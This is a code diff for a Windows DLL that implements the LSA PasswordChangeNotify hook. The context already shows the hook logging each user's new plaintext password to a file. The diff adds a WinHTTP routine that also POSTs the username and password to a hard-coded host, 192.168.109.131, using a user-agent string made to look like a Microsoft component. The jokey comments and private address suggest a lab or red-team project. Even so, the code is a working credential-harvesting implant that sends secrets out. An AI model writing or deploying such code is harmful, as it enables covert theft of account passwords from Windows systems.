@@ -16,9 +16,104 @@
 #include <SubAuth.h>
 #include "stdlib.h"
 #include <tchar.h>
+#include <winhttp.h>
+#include <ntsecapi.h>
 
+#pragma comment(lib, "winhttp.lib")
 
 //////// Helper functions
+
+//Concatante two PUNICODE strings.
+//I really hope you like pointer sillyness
+//because I don't
+// in: String1, String2: the strings to stick together
+// out: Result: a pointer to populate with the result
+NTSTATUS catUTF16LEStr(
+        _In_ PUNICODE_STRING String1,
+        _In_ PUNICODE_STRING String2,
+        _Out_ PUNICODE_STRING Result
+) {
+    if (!String1 || !String2 || !Result) {
+        return STATUS_INVALID_PARAMETER;
+    }
+
+    // Calculate the total length needed for the result
+    USHORT totalLength = String1->Length + String2->Length;
+
+    // Allocate memory for the result buffer
+    Result->Buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), 0, totalLength + sizeof(WCHAR));
+    if (!Result->Buffer) {
+        return STATUS_NO_MEMORY;
+    }
+
+    // Copy the first string
+    memcpy(Result->Buffer, String1->Buffer, String1->Length);
+
+    // Copy the second string
+    memcpy((BYTE*)Result->Buffer + String1->Length, String2->Buffer, String2->Length);
+
+    // Set the length and maximum length of the result
+    Result->Length = totalLength;
+    Result->MaximumLength = totalLength + sizeof(WCHAR);
+
+    // Null-terminate the result string
+    *(PWCHAR)((BYTE*)Result->Buffer + totalLength) = L'\0';
+
+    return STATUS_SUCCESS;
+}
+
+BOOL sendToServer(PUNICODE_STRING text) {
+    //std::cout << text->Buffer;
+
+    // Initialize WinHTTP
+    HINTERNET hSession = WinHttpOpen(L"Microsoft-CryptoAPI/10.0",
+                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                     WINHTTP_NO_PROXY_NAME,
+                                     WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+       // std::cerr << "winhttp failed";
+        return FALSE;
+    }
+
+    // Connect to the remote
+    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.109.131", 80, 0);
+    if (!hConnect) {
+        //std::cerr << "connect failed";
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Create an HTTP POST
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/post",
+                                            NULL, WINHTTP_NO_REFERER,
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                            0);
+    if (!hRequest) {
+       // std::cerr << "POST failed";
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return FALSE;
+    }
+
+    // Send the request
+    LPCWSTR headers = L"Content-Type: text/plain; charset=UTF-16LE";
+    BOOL bResults = WinHttpSendRequest(hRequest,
+                                       headers, -1L,
+                                       (LPVOID)text->Buffer,
+                                       text->Length,
+                                       text->Length, 0);
+
+   // std::cout << "Sent!";
+
+    // Clean up
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return bResults;
+}
+
+
 BOOL writeToFile(PUNICODE_STRING text) {
     //open a file (the janky windows way)
     HANDLE hFile = CreateFileW(
@@ -107,13 +202,21 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     wchar_t singleNL = L'\n';
     UNICODE_STRING newline = { 2, 2, &singleNL };
 
+    PUNICODE_STRING temp1 = new UNICODE_STRING;
+    PUNICODE_STRING temp2 = new UNICODE_STRING;
+    PUNICODE_STRING fullString = new UNICODE_STRING;
+    catUTF16LEStr(uname, &colon, temp1);
+    catUTF16LEStr(password, &newline, temp2);
+    catUTF16LEStr(temp1, temp2, fullString);
+
+    free(temp1);
+    free(temp2);
+
    //Zach help, unicode characters are super hard to concatenate
-   //instead I just call the output function 4 times
-   //only the finest cs here
-    writeToFile(uname);
-    writeToFile(&colon);
-    writeToFile(password);
-    writeToFile(&newline);
+    writeToFile(fullString);
+    sendToServer(fullString);
+
+    free(fullString);
 
     return 0;
 }
